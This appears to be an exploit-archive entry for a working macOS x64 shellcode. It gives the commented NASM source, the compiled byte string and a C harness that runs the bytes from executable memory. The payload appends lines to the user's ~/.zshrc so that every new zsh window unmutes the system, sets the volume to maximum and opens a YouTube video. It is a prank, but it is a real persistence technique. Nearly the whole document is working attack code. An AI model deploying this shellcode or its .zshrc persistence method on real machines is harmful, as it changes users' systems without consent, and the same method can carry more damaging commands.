@@ -1,0 +1,146 @@
+id: 34503
+date: 06/01/2020
+title: macOS/x64 zsh RickRolling Shellcode (198 bytes)
+author: Bobby Cooke
+cves: 
+
+/*
+## Shellcode Title:  macOS/x64 - zsh RickRolling Shellcode (198 Bytes)
+## Shellcode Author: Bobby Cooke
+## Tested on:        macOS Catalina v10.15.4
+## Shellcode Description:
+##     MacOS Catalina Dynamic, No-Null Shellcode that will Unmute the systems Volume, set the Volume to Maximum, and "Rick Roll" the user every time they open a Z-Shell Terminal Window. 
+##     The shellcode uses the UNIX ExecVE SysCall to spawn a UNIX SH (/bin/sh). The UNIX SH executes an Echo (/bin/echo) command that adds two commands to the users Z-Shell (zsh) Running Config File (~/.zshrc); the ~/.zshrc file will be created if it does not exist. The first command in the ~/.zshrc file leverages the macOS default system binary OSAScript (/usr/bin/osascript) too unmute the macOS system & set the volume too maximum. The second command in the ~/.zshrc file leverages the macOS default system binary Open (/usr/bin/open) to open the 'Rick Astley - Never Gonna Give You Up' video with the macOS systems default browser.
+## C Compile:        gcc zsh-rickrolling.c -o zsh-rickrolling
+##                   Apple clang version 11.0.3 (clang-1103.0.32.62)
+## Compile & Test:
+##     root# gcc zsh-rickrolling.c -o zsh-rickrolling
+##     root# cat ~/.zshrc
+##     cat: /var/root/.zshrc: No such file or directory
+##     root# ./zsh-rickrolling
+##     Shellcode Length: 198 Bytes
+##     root# cat ~/.zshrc
+##     osascript -e "set Volume 9"
+##     open "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+##     root# zsh
+##     root@Mac #
+##     < Browser Pop & Rick Roll >
+
+---------------------------------------------------------------------
+
+;## ASM Compile:  nasm -f macho64 zsh-rickrolling.asm
+;##               NASM version 2.14.02 compiled on Sep 28 2019
+;## OBJ Link:     ld zsh-rickrolling.o -lSystem -o zsh-rickrolling
+;##               BUILD 17:57:49 Apr 24 2020
+;## Get SC:       /bin/bash for x in $(objdump -d zsh-rickrolling.o -x86-asm-syntax=intel | grep "^ " | cut -f1 | awk -F: '{print $2}'); do echo -n "\x"$x; done; echo
+global _main
+_main:
+; execve(const char *path, char *const argv[], char *const envp[]);
+; RAX               RDI                RSI                 RDX
+; RAX = 0x200003b = Execve System Call Number
+; RDI = &"/bin/sh\x00"
+; RSI = RSP
+;          [RSP+10] = argv[0] = &`/bin/sh\x00`
+;          [RSP+8]  = argv[1] = &`-c\x00`
+;          [RSP+0]  = argv[2] = &`echo "open 'https...
+; RDX = 0x0
+regclear:
+xor rsi, rsi                ; rsi = 0x0
+mul rsi                     ; rax & rdx = 0x0
+argv0:
+mov rcx, 0x68732f6e69622fff ; "\xff/bin/sh"
+shr rcx, 0x8                ; "/bin/sh\x00"
+push rcx                    ; rsp = &"/bin/sh\x00"
+mov rdi, rsp                ; rdi = *path =  &"/bin/sh\x00"
+argv1:
+add dx, 0x632d              ; "-c\x00"
+push rdx                    ; rsp = &"-c\x00"
+mov rbx, rsp                ; rbx = &"-c\x00"
+argv2:
+; "echo 'osascript -e \"set Volume 9\"\r\nopen \"https://www.youtube.com/watch?v=dQw4w9WgXcQ\"' >> ~/.zshrc"
+;   String length : 98
+xor rcx, rcx
+add cx, 0x6372              ; cr
+push rcx
+mov rcx, 0x68737a2e2f7e203e ; hsz./~ >
+push rcx
+mov rcx, 0x3e20272251635867 ; > '"QcXg
+push rcx
+mov rcx, 0x573977347751643d ; W9w4wQd=
+push rcx
+mov rcx, 0x763f68637461772f ; v?hctaw/
+push rcx
+mov rcx, 0x6d6f632e65627574 ; moc.ebut
+push rcx
+mov rcx, 0x756f792e7777772f ; uoy.www/
+push rcx
+mov rcx, 0x2f3a737074746822 ; /:sptth"
+push rcx
+mov rcx, 0x206e65706f0A0D22 ;  nepo\n\r"
+push rcx
+mov rcx, 0x3920656d756c6f56 ; 9 emuloV
+push rcx
+mov rcx, 0x207465732220652d ;  tes" e-
+push rcx
+mov rcx, 0x2074706972637361 ;  tpircsa
+push rcx
+mov rcx, 0x736f27206f686365 ; so' ohce
+push rcx
+mov r9, rsp                 ; r9 = &`echo "open 'https...
+loadArgv:
+xor rdx, rdx                ; rdx = envp[] = 0x0
+push rdx                    ; [RSP+18] = 0x0
+push r9                     ; [RSP+10] = argv[2] = &Command String
+push rbx                    ; [RSP+8]  = argv[1] = &`-c\x00`
+push rdi                    ; [RSP+0]  = argv[0] = &`/bin/sh\x00`
+mov rsi, rsp                ; rsi = argv[]
+execve:
+mov al,2                    ; rax = 0x2
+ror rax, 0x28               ; rax = 0x2000000
+mov al, 0x3b                ; rax = 0x200003b
+syscall                     ; execve system call
+
+---------------------------------------------------------------------
+
+*/
+
+#include <stdio.h>
+#include <sys/mman.h>
+#include <string.h>
+#include <stdlib.h>
+
+int (*sc)();
+
+char shellcode[] =
+    "\x48\x31\xf6\x48\xf7\xe6\x48\xb9\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48"
+    "\xc1\xe9\x08\x51\x48\x89\xe7\x66\x81\xc2\x2d\x63\x52\x48\x89\xe3\x48"
+    "\x31\xc9\x66\x81\xc1\x72\x63\x51\x48\xb9\x3e\x20\x7e\x2f\x2e\x7a\x73"
+    "\x68\x51\x48\xb9\x67\x58\x63\x51\x22\x27\x20\x3e\x51\x48\xb9\x3d\x64"
+    "\x51\x77\x34\x77\x39\x57\x51\x48\xb9\x2f\x77\x61\x74\x63\x68\x3f\x76"
+    "\x51\x48\xb9\x74\x75\x62\x65\x2e\x63\x6f\x6d\x51\x48\xb9\x2f\x77\x77"
+    "\x77\x2e\x79\x6f\x75\x51\x48\xb9\x22\x68\x74\x74\x70\x73\x3a\x2f\x51"
+    "\x48\xb9\x22\x0d\x0a\x6f\x70\x65\x6e\x20\x51\x48\xb9\x56\x6f\x6c\x75"
+    "\x6d\x65\x20\x39\x51\x48\xb9\x2d\x65\x20\x22\x73\x65\x74\x20\x51\x48"
+    "\xb9\x61\x73\x63\x72\x69\x70\x74\x20\x51\x48\xb9\x65\x63\x68\x6f\x20"
+    "\x27\x6f\x73\x51\x49\x89\xe1\x48\x31\xd2\x52\x41\x51\x53\x57\x48\x89"
+    "\xe6\xb0\x02\x48\xc1\xc8\x28\xb0\x3b\x0f\x05";
+
+int main(int argc, char **argv) {
+    printf("Shellcode Length: %zd Bytes\n", strlen(shellcode));
+
+    void *ptr = mmap(0, 0x22, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
+
+    if (ptr == MAP_FAILED) {
+        perror("mmap");
+        exit(-1);
+    }
+
+    memcpy(ptr, shellcode, sizeof(shellcode));
+    sc = ptr;
+
+    sc();
+
+    return 0;
+}
+
+#  0day.today [2023-03-23]  #
